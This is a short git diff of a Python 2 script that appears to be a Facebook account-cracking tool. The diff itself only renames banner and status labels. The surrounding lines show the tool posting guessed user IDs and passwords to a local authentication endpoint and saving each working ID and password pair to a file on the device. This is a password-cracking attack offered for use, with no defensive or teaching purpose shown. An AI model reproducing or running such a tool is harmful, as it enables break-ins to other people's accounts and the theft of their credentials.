@@ -1027,7 +1027,7 @@ def n_s():
     print ' \x1b[1;97mCrack Running\x1b[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94mKing Of FB FEEL\x1b[1;91m'
+    print '\t\x1b[1;94mQUEEN OF FB PATHANI\x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
@@ -1101,7 +1101,7 @@ def n_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[PATHANJ-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print '\x1b[1;92m[PATHANI-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('/sdcard/ids/KING_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
